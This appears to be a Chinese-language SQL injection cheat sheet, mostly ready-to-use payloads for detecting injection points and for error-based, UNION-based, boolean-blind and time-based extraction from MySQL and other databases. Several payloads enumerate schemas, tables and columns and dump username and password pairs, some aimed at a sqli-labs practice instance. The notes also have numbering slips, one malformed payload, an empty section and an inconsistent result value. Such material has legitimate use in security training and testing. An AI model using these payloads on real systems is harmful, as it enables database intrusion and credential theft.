SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database.

## 1. Entry point

只要与数据库进行交互就可能存在 SQLi

```
GET: /test?id=payload
POST: username=payload
Cookie: uid=payload
```

> 有时 SQLi 需要末尾添加注释符 `-- ` 才能执行, 其中仅用于 MySQL 有另一个注释符 `#` ;
>
> 需要闭合 `''` , `""` 和 `()` ; 注意语法要符合 `Types` .

> 在 Burp 中测试必须将特殊符号进行 URL 编码.

## 2. Detection

检测是否存在 SQLi, 并判断闭合方式

这里推荐使用 [SQLi Query Tampering](https://portswigger.net/bappstore/86549d1076bd485aa84c2c2685bd9ffd) 生成 Payload

### 2.1. Error

传入特殊字符触发报错, 添加注释符后正常

```
 
'
"
)
')
")
;
*
\
%CA%BA
%CA%B9
```

常见的 Bypass 有 URL 编码和双重 URL 编码

> 其中 `%CA%BA` 和 `%CA%B9` 为 `U+02BA` 和 `U+02B9` 的 URL 编码, 可能被误判为 `U+0022` 和 `U+0027` 从而实现注入

### 2.2. Bool

使用恒等条件判断, 若为 `true` 则返回数据, 若为 `false` 则没有数据

> 可用于判断闭合方式

```
 OR 1=1      # true
 AND 1=2     # false
 OR 1=1 --   # true
 AND 1=2 --  # false
' OR 1=1      # true
' AND 1=2     # false
' OR 1=1 --   # true
' AND 1=2 --  # false
" OR 1=1      # true
" AND 1=2     # false
" OR 1=1 --   # true
" AND 1=2 --  # false
) OR 1=1      # true
) AND 1=2     # false
) OR 1=1 --   # true
) AND 1=2 --  # false
') OR 1=1      # true
') AND 1=2     # false
') OR 1=1 --   # true
') AND 1=2 --  # false
") OR 1=1      # true
") AND 1=2     # false
") OR 1=1 --   # true
") AND 1=2 --  # false
```

> 注意添加注释符时需要闭合 `''` , `""` 和 `()` 

可通过 Merging characters 来 Bypass

```
`+HERP
'||'HERP
'+'HERP
' 'HERP
'%20'HERP
'%2B'HERP
```

### 2.3. Time

通过是否执行延时命令判断

```
' AND SLEEP(5) --+ # MySQL
' AND IF(NOW()=SYSDATE(), SLEEP(5), 0) --+ # MySQL
' XOR (IF(NOW() = SYSDATE(), SLEEP(5), 0)) XOR 'Z # MySQL
' AND IF(SUBSTRING(@@VERSION, 1, 1) = '5', SLEEP(5), 0) --+ # MySQL

' WAITFOR DELAY '00:00:05' --+ # MSSQL

'; SELECT CASE WHEN (1=1) THEN PG_SLEEP(5) ELSE PG_SLEEP(0) END --+ # PostgreSQL

' AND 1=(SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(5) ELSE 1 END FROM DUAL)--+ # Oracle
```

使用 URL 编码避免报错

## 3. DBMS

### 3.1. MySQL

支持十六进制编码, `table_schema='dvwa'` 可修改为 `table_schema=0x64767761` 以绕过对 `''` 和 `""` 的转义

元数据库 `information_schema` 

- 数据表 `tables` 存储了所有数据库中的所有表的信息

  > 字段 `table_schema` 存储数据库名
  >
  > 字段 `table_name` 存储该数据库下的表名

- 数据表 `columns` 存储了所有的数据表和字段的关系

  > 字段 `table_schema` 存储数据库名  
  >
  > 字段 `table_name` 存储表名  
  >
  > 字段 `column_name` 存储对应表中的字段名

## 4. Types

### 4.1. SELECT

基于 SELECT 的 SQL 语句

```
SELECT * FROM users WHERE id = 1;
SELECT * FROM users WHERE id = '1';
SELECT * FROM users WHERE id = "1";
SELECT * FROM users WHERE id = (1);
SELECT * FROM users WHERE id = ('1');
SELECT * FROM users WHERE id = ("1");
SELECT * FROM users WHERE id = '%1%';
SELECT * FROM users WHERE id = "%1%";
```

```
NULL\  # error
NULL'  # error
NULL"  # error
NULL)  # error
NULL') # error
NULL") # error
NULL OR 1=1      # true
NULL AND 1=2     # false
NULL OR 1=1 --   # true
NULL AND 1=2 --  # false
NULL' OR 1=1      # true
NULL' AND 1=2     # false
NULL' OR 1=1 --   # true
NULL' AND 1=2 --  # false
NULL" OR 1=1      # true
NULL" AND 1=2     # false
NULL" OR 1=1 --   # true
NULL" AND 1=2 --  # false
NULL) OR 1=1      # true
NULL) AND 1=2     # false
NULL) OR 1=1 --   # true
NULL) AND 1=2 --  # false
NULL') OR 1=1      # true
NULL') AND 1=2     # false
NULL') OR 1=1 --   # true
NULL') AND 1=2 --  # false
NULL") OR 1=1      # true
NULL") AND 1=2     # false
NULL") OR 1=1 --   # true
NULL") AND 1=2 --  # false
```

### 4.2.  INSERT/UPDATE

基于 INSERT 或 UPDATE 的 SQL 语句

```
INSERT INTO users (uname) VALUES ('1');
INSERT INTO users (uname) VALUES ("1");
UPDATE users SET uname = '1' WHERE id = 1;
UPDATE users SET uname = "1" WHERE id = 1;
```

```
NULL' OR UPDATEXML(1, CONCAT(0x7e, USER(), 0x7e), 1) OR ' # error
NULL" OR UPDATEXML(1, CONCAT(0x7e, USER(), 0x7e), 1) OR " # error
```

## 5. UNION

使用 `UNION` 时推荐查询 `NULL` 以显示 `UNION` 的查询结果

### 5.1 Column count

利用 ORDER BY 判断有几个字段

```
NULL' ORDER BY 4 -- 
```

> 当写入使用第 4 个字段排序时报错，说明后台查询有 3 个字段;
>
> 可尝试二分法.

### 5.1. Location

判断回显的位置

```
NULL' UNION SELECT 1, 2, 3 -- 
```

> 查询字段数量必须与 `Column count` 相同

### 5.2. Database

在有回显的位置显示所有数据库名

```
NULL' UNION SELECT 1, 2, (SELECT GROUP_CONCAT(DISTINCT table_schema) FROM information_schema.tables) -- 
```

在有回显的位置显示当前数据库名

```
NULL' UNION SELECT 1, 2, DATABASE() -- 
```

亦可查询以下内容

| 操作                 | 描述         |
| -------------------- | ------------ |
| VERSION()            | MySQL 版本   |
| USER()               | 数据库用户名 |
| DATABASE()           | 数据库名     |
| @@DATADIR            | 数据库路径   |
| @@VERSION_COMPILE_OS | 系统版本     |

### 5.3. Tables

获取指定数据库的所有数据表名

```
NULL' UNION SELECT 1, 2, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='security') -- 
```

获取当前数据库的所有数据表名

```
NULL' UNION SELECT 1, 2, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE()) -- 
```

### 5.4. Columns

获取指定数据库中指定数据表的所有字段名

```
NULL' UNION SELECT 1, 2, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema='security' AND table_name='users') -- 
```

获取当前数据库中指定数据表的所有字段名

```
NULL' UNION SELECT 1, 2, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='users') -- 
```

### 5.5. Dump

获取指定数据库中指定数据表中的所有数据

```
NULL' UNION SELECT 1, 2, (SELECT GROUP_CONCAT(username, 0x3A, password) FROM security.users) -- 
```

获取当前数据库中指定数据表中的所有数据

```
NULL' UNION SELECT 1, 2, (SELECT GROUP_CONCAT(username, 0x3A, password) FROM users) -- 
```

## 6. Error

报错注入的常用函数

```
UPDATEXML(1, CONCAT(0x7e, USER(), 0x7e), 0)
EXTRACTVALUE(1, CONCAT(0x7e, USER(), 0x7e))
FLOOR()
```

报错注入经常存在显示不全的问题, 因此需要分段提取

```
SUBSTRING(string, 1, 2) # 从首个字符开始截取两个字符
LIMIT 0, 2              # 从首行开始截取两行
```

### 6.1. Location

判断是否有回显

```
NULL' OR UPDATEXML(1, CONCAT(0x7e, USER(), 0x7e), 0) OR '
```

```
NULL' OR EXTRACTVALUE(1, CONCAT(0x7e, USER(), 0x7e)) OR '
```

```
NULL' OR UPDATEXML(1, CONCAT(0x7e, (SELECT SUBSTRING(USER(), 1, 1)), 0x7e), 0) OR '
```

```
NULL' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT SUBSTRING(USER(), 1, 1)), 0x7e)) OR '
```

### 6.2. Database

显示所有数据库名

```
NULL' OR UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(DISTINCT table_schema) FROM information_schema.tables), 0x7e), 0) OR '
```

```
NULL' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(DISTINCT table_schema) FROM information_schema.tables), 0x7e)) OR '
```

```
NULL' OR UPDATEXML(1, CONCAT(0x7e, (SELECT SUBSTRING((SELECT GROUP_CONCAT(DISTINCT table_schema) FROM information_schema.tables), 1, 1)), 0x7e), 0) OR '
```

```
NULL' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT SUBSTRING((SELECT GROUP_CONCAT(DISTINCT table_schema) FROM information_schema.tables), 1, 1)), 0x7e)) OR '
```

显示当前数据库名

```
NULL' OR UPDATEXML(1, CONCAT(0x7e, DATABASE(), 0x7e), 0) OR '
```

```
NULL' OR EXTRACTVALUE(1, CONCAT(0x7e, DATABASE(), 0x7e)) OR '
```

```
NULL' OR UPDATEXML(1, CONCAT(0x7e, (SELECT SUBSTRING(DATABASE(), 1, 1)), 0x7e), 0) OR '
```

```
NULL' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT SUBSTRING(DATABASE(), 1, 1)), 0x7e)) OR '
```

亦可查询以下内容

| 操作                 | 描述         |
| -------------------- | ------------ |
| VERSION()            | MySQL 版本   |
| USER()               | 数据库用户名 |
| DATABASE()           | 数据库名     |
| @@DATADIR            | 数据库路径   |
| @@VERSION_COMPILE_OS | 系统版本     |

### 6.3. Tables

获取指定数据库的所有数据表名

```
NULL' OR UPDATEXML(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema='security' LIMIT 0, 1), 0x7e), 0) OR '
```

```
NULL' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema='security' LIMIT 0, 1), 0x7e)) OR '
```

```
NULL' OR UPDATEXML(1, CONCAT(0x7e, (SELECT SUBSTRING(table_name, 1, 1) FROM information_schema.tables WHERE table_schema='security' LIMIT 0, 1), 0x7e), 0) OR '
```

```
NULL' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT SUBSTRING(table_name, 1, 1) FROM information_schema.tables WHERE table_schema='security' LIMIT 0, 1), 0x7e)) OR '
```

获取当前数据库的所有数据表名

```
NULL' OR UPDATEXML(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0, 1), 0x7e), 0) OR '
```

```
NULL' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0, 1), 0x7e)) OR '
```

```
NULL' OR UPDATEXML(1, CONCAT(0x7e, (SELECT SUBSTRING(table_name, 1, 1) FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0, 1), 0x7e), 0) OR '
```

```
NULL' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT SUBSTRING(table_name, 1, 1) FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0, 1), 0x7e)) OR '
```

### 6.4. Columns

获取指定数据库中指定数据表的所有字段名

```
NULL' OR UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema='security' AND table_name='users'), 0x7e), 0) OR '
```

```
NULL' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema='security' AND table_name='users'), 0x7e)) OR '
```

```
NULL' OR UPDATEXML(1, CONCAT(0x7e, (SELECT SUBSTRING((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema='security' AND table_name='users'), 1, 1)), 0x7e), 0) OR '
```

```
NULL' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT SUBSTRING((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema='security' AND table_name='users'), 1, 1)), 0x7e)) OR '
```

获取当前数据库中指定数据表的所有字段名

```
NULL' OR UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='users'), 0x7e), 0) OR '
```

```
NULL' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='users'), 0x7e)) OR '
```

```
NULL' OR UPDATEXML(1, CONCAT(0x7e, (SELECT SUBSTRING((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='users'), 1, 1)), 0x7e), 0) OR '
```

```
NULL' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT SUBSTRING((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='users'), 1, 1)), 0x7e)) OR '
```

### 6.5. Dump

获取指定数据库中指定数据表中指定字段名的所有数据

```
NULL' OR UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(username, 0x3A, password) FROM security.users), 0x7e), 0) OR '
```

```
NULL' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(username, 0x3A, password) FROM security.users), 0x7e)) OR '
```

```
NULL' OR UPDATEXML(1, CONCAT(0x7e, (SELECT SUBSTRING((SELECT GROUP_CONCAT(username, 0x3A, password) FROM security.users), 1, 1)), 0x7e), 0) OR '
```

```
NULL' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT SUBSTRING((SELECT GROUP_CONCAT(username, 0x3A, password) FROM security.users), 1, 1)), 0x7e)) OR '
```

获取当前数据库中指定数据表中指定字段名的所有数据

```
NULL' OR UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(username, 0x3A, password) FROM users), 0x7e), 0) OR '
```

```
NULL' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(username, 0x3A, password) FROM users), 0x7e)) OR '
```

```
NULL' OR UPDATEXML(1, CONCAT(0x7e, (SELECT SUBSTRING((SELECT GROUP_CONCAT(username, 0x3A, password) FROM users), 1, 1)), 0x7e), 0) OR '
```

```
NULL' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT SUBSTRING((SELECT GROUP_CONCAT(username, 0x3A, password) FROM users), 1, 1)), 0x7e)) OR '
```

## 7. Bool

当没有回显时，可以根据反馈信息的真假进行注入

### 7.1. 爆库

判断数据库长度

> 通过使用 `length` 计算字段的长度判断真假（一个汉字为 3 个字符，一个数字或字母为 1 个字符）

```
http://192.168.1.76/sqli-labs/Less-1/?id=1' and (length(database()) > 10) --+
```

```
http://192.168.1.76/sqli-labs/Less-1/?id=1' and (length(database()) = 8) --+
```

> 通过二分法缩小范围，当长度为 8 时不报错
>
> 得到数据库的长度为 8 个字符

判断数据库名

> 用 `substr` 从数据库中取出第一个字符

```
http://192.168.1.76/sqli-labs/Less-1/?id=1' and ascii(substr(database(),1,1)) > 100 --+
```

```
http://192.168.1.76/sqli-labs/Less-1/?id=1' and ascii(substr(database(),1,1)) = 115 --+
```

> 用二分法判断 `ascii` 数值
>
> 第一个字符的 ascii 码为 115，字符为 s

```
http://192.168.1.76/sqli-labs/Less-1/?id=1' and ascii(substr(database(),2,1)) = 101 --+
```

> 第二个字符的 ascii 码为 101，字符为 e
>
> 最后得到数据库名为 security

`mid` 与 `substr` 效果相同

 `left` （从左侧第一个开始取三个字符）

```
http://192.168.1.76/sqli-labs/Less-1/?id=1' and ascii(left(database(),3)) > 100 --+
```

 `right` （从右侧第一个开始区三个字符）

```
http://192.168.1.76/sqli-labs/Less-1/?id=1' and ascii(right(database(),3)) > 100 --+
```

### 8.2. 爆表

判断数据表的个数

```
http://192.168.1.76/sqli-labs/Less-1/?id=1' and (select count(*) from information_schema.tables where table_schema=database())=4 --+
```

> 数据表为 4 个

当 `information_schema` 被过滤时使用 `sys.schema`

> 在 `mysql 5.7` 中新增了 `sys.schema` 基础数据来自于 `performance_chema` 和 `information_schema` 两个库，本身数据库不存储数据

判断第一个数据表的长度

```
?id=1' and （select length(table_name）from information_schema.tables where table_schema=database() LIMIT 0, 1)=1 --+
```

### 7.3. 爆字段

判断字段的个数

```
http://192.168.1.76/sqli-labs/Less-1/?id=1' and (select count(*) from information_schema.columns where table_schema=database() and table_name='users')=3 --+
```

> 字段为 3 个

当 `information_schema` 被过滤时使用 `sys.schema`

> 在 `mysql 5.7` 中新增了 `sys.schema` 基础数据来自于 `performance_chema` 和 `information_schema` 两个库，本身数据库不存储数据

### 7.4. 拖库

## 8. Time

当反馈信息没有区别时，可以根据响应时间进行注入

> http://192.168.1.76/sqli-labs/Less-8/

### 8.1. 判断是否存在 SQL 注入

尝试传递特殊字符 `` `

```
http://192.168.1.76/sqli-labs/Less-8/?id=1'
```

> 当传递 `'` 时报错，说明符号被注入，存在 SQL 注入
>
> 但是没有回显

添加注释使之正常访问

```
http://192.168.1.76/sqli-labs/Less-8/?id=1' --+
```

### 8.2. 爆库

判断数据库长度

> 通过使用 `length` 计算字段的长度判断真假（一个汉字为 3 个字符，一个数字或字母为 1 个字符）

```
http://192.168.1.76/sqli-labs/Less-1/?id=1' and if(length(database()) > 10,sleep(3),1) --+
```

> 最后得到数据库长度为 8

判断数据库名

```
http://192.168.1.76/sqli-labs/Less-8/?id=1' and if(ascii(substr(database(),1,1)) = 100,sleep(3),1) --+
```

> 当数据库的第一个字符 ascii 码长度为 100 时，则正常，否则休眠三秒
>
> 最后得到 ascii 码为 150

---

References

- [SQL injection](https://portswigger.net/web-security/sql-injection)
- [SQL Injection](https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/)
